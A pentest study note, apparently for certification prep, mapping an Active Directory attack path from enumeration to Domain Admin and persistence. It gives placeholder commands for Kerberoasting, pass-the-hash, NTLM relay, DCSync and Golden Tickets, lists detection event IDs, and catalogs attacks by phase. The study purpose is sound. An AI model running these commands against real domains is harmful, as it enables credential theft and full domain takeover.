# Active Directory Enumeration & Attacks

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Enumerate and attack Active Directory end to end: from no creds → a foothold user → privilege escalation / lateral movement → Domain Admin → persistence. The largest module and the core of internal pentesting.

## AD attack flow (reference)
Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).

### 1. Enumeration (always first)
Goal: users, computers, groups, misconfigs.
```bash
# no creds
nmap -p88,135,139,389,445,464,593,636,3268,3389 --script="ldap* smb*" <HOST>
smbclient -L //<DC> -N                 # null-session shares
crackmapexec smb <DC>                   # host/domain info
kerbrute userenum -d <domain> --dc <DC> users.txt    # valid users (no creds needed)
# with creds
bloodhound-python -u <u> -p <p> -d <domain> -c All -dc-ip <DC>   # map attack paths
crackmapexec ldap <DC> -u <u> -p <p> --asreproast
rpcclient -U '<u>%<p>' <DC>
net user /domain ; net group "Domain Admins" /domain    # (on a Windows foothold)
```

### 2. Get / escalate credentials
```bash
# Kerberoasting (any domain user can request SPN tickets)
GetUserSPNs.py -dc-ip <DC> <domain>/<u>:<p> -request
hashcat -m 13100 hash.txt rockyou.txt
# AS-REP Roasting (accounts with "do not require pre-auth")
GetNPUsers.py -dc-ip <DC> -usersfile users.txt <domain>/ -format hashcat
hashcat -m 18200 hash.txt rockyou.txt
```

### 3. Lateral movement
```bash
# dump creds from a compromised host (admin)
# mimikatz: sekurlsa::logonpasswords
# Pass-the-Hash
psexec.py <domain>/<u>@<HOST> -hashes <LM>:<NT>
crackmapexec smb <range> -u <u> -H <NT>        # spray a hash across hosts
# NTLM relay (when SMB signing is disabled)
ntlmrelayx.py -t smb://<HOST> --smb2support
```

### 4. Domain compromise + persistence
```bash
whoami /groups ; net group "Domain Admins" /domain     # confirm DA
# dump all domain hashes (DCSync, needs DA or replication rights)
secretsdump.py <domain>/<admin>:<pass>@<DC>
# Golden Ticket (persistence; needs the krbtgt hash)
# mimikatz: kerberos::golden /user:Administrator /domain:<d> /sid:<SID> /krbtgt:<hash> /ptt
```

### Decision tree (what to try next)
1. **No creds?** → enumerate (kerbrute, null SMB, CME). **Have creds?** → BloodHound + CME.
2. **Kerberoast / AS-REP possible?** → grab hashes, crack offline. **No?** → lateral movement.
3. **SMB/LDAP/Kerberos misconfig?** → NTLM relay / PtH / Kerberos attacks. **No?** → local privesc on a workstation (modules 25/26).
4. **Domain Admin?** → DCSync + persistence. **No?** → pivot to another user/host, repeat.

> BloodHound is the force multiplier — it shows the *shortest path* to DA so you're not guessing. Kerberoasting + AS-REP roasting are the highest-value early wins because any domain user can attempt them. krbtgt hash = keys to the kingdom (Golden Ticket).

## Key AD attacks — detail (reference)
Commands are standard tooling; all intrusive, scope + approval. Detection Event IDs included for the report/remediation side.

### DCSync (domain replication abuse)
Impersonate a DC and pull hashes via replication — needs **Replicating Directory Changes** rights (DA or delegated). Pulling **krbtgt** enables Golden Ticket.
```powershell
# who has replication rights (abusable)
Get-ObjectAcl -DistinguishedName "dc=<domain>,dc=local" -ResolveGUIDs | ? {$_.ObjectType -match 'replication'}
# dump
mimikatz: lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
# or impacket: secretsdump.py <domain>/<admin>:<pass>@<DC>
```
**Detect/mitigate:** Event ID 4662; replication rights to trusted accounts only; rotate krbtgt regularly.

### Golden Ticket (persistence)
With the **krbtgt hash**, forge TGTs for any user — survives password changes and account deletion.
```text
mimikatz: kerberos::golden /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /user:Administrator /ptt
```
**Detect/mitigate:** Event IDs 4769/4672; rotate krbtgt password twice; strong Kerberos policy. (Silver Ticket = same idea but forges a TGS for one service using that service account's hash.)

### Shadow Credentials (Key Trust abuse)
Write to a victim's **msDS-KeyCredentialLink** to add attacker-controlled key creds → authenticate as them without resetting their password. Needs write rights over the target (find via BloodHound).
```text
# tooling: Whisker (add key cred) + Rubeus (request TGT with the cert)
# enum: Get-ADUser -Filter * -Properties msDS-KeyCredentialLink
```
**Detect/mitigate:** Event ID 5136 (msDS-KeyCredentialLink changes); restrict who can write it; ADCS hardening.

### Printer Bug / PrintNightmare (MS-RPRN)
Spooler RPC coerces a host to authenticate to the attacker (→ relay) or loads a malicious driver DLL as SYSTEM. Variants: CVE-2021-1675, CVE-2021-34527.
```text
sc qc Spooler                  # is the service running?
# coercion: SpoolSample / printerbug.py <attacker> <victim>  → feed into NTLM relay
```
**Detect/mitigate:** disable Spooler where unneeded — **always on Domain Controllers**; patch.

### NTLM Relay (no password needed)
Capture NTLM auth and relay it to another service (SMB/LDAP/HTTP). Works when **signing is not enforced**.
```bash
responder -I <iface> -wrf              # capture / coerce auth
ntlmrelayx.py -tf targets.txt -smb2support    # relay (add --escalate-user / -c for actions)
```
**Detect/mitigate:** **enable SMB signing** (blocks SMB relay); enforce LDAP signing + channel binding; reduce admin sprawl.

> These five are the backbone of internal pentests: Printer Bug/NTLM relay get you from low-priv to a hash/foothold, DCSync gets krbtgt, Golden Ticket keeps it forever. Shadow Credentials is the stealthy modern takeover-a-user move.

## AD attack catalog (by phase — study/coverage index)
The full menu. Commands for the core ones are in the attack-flow above; this is the map so I know what exists and when it applies. **CPTS focus = the post-access AD attacks** (credential dumping → privesc → lateral → persistence). Initial-access social/physical and Azure/cloud items are mostly red-team / cloud scope — know the names, but they're outside core CPTS.

**1. Initial access** (mostly red-team scope): phishing, malicious macros, credential stuffing, pass-the-cookie, malicious USB/Rubber Ducky, exposed SMB shares, VPN cred hijack, zero-day (e.g. Log4Shell), **LLMNR/NBT-NS poisoning** (Responder — this one *is* core), evil twin, watering hole, supply chain.

**2. Credential dumping:** Mimikatz (LSASS), **DCSync**, LSASS dump, SAM/SYSTEM hive, Kerberos ticket extraction, **NTDS.dit** dump, WDigest, cached creds (mscache), browser creds, DPAPI.

**3. Privilege escalation:** **Kerberoasting**, **AS-REP roasting**, token impersonation, Pass-the-Hash, **Print Spooler / PrintNightmare**, unconstrained/constrained delegation abuse, local privesc (CVEs → modules 25/26), SeBackup/SeRestorePrivilege, S4U2Self/S4U2Proxy, DNSAdmins DLL load, **AD CS abuse (ESC1-8)**.

**4. Lateral movement:** PtH, Pass-the-Ticket, SMB relay, PsExec, RDP hijack, WMI, BloodHound (path-finding), DCOM, WinRM, Printer Bug, **PetitPotam**, domain/forest trust abuse.

**5. Persistence / domain takeover:** **Golden Ticket** (krbtgt), **Silver Ticket** (service), Skeleton Key, AdminSDHolder, GPO hijack, SID history injection, **Shadow Credentials**, **RBCD**, DCShadow, WMI event sub, registry run keys, AD Recycle Bin, ADFS token forgery, Azure AD Connect.

**6. NTLM & Kerberos protocol attacks:** NTLM relay, NTLMv1 downgrade, Kerberos downgrade, **Overpass-the-Hash**, pre-auth brute force, PAC tampering, TGT delegation, **Bronze Bit (CVE-2020-17049)**, LDAP relay.

**7. Data exfil / domain persistence:** ldapdomaindump, **GPP cpassword** (Groups.xml in SYSVOL), LSA secrets, SYSVOL creds, MSSQL (AD-integrated) privesc, VSS shadow copy, cloud sync, ADFS cert theft, Azure AD.

**8. Misc:** PowerView recon, AD object/ACL permission abuse, unconstrained delegation TGT capture.

> Bolded = the ones that actually come up most in CPTS/internal pentests. If I learn this column cold — LLMNR poisoning, Kerberoasting, AS-REP, DCSync, PtH, Golden/Silver ticket, delegation, AD CS, GPP cpassword — I've got the exam's AD surface covered.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
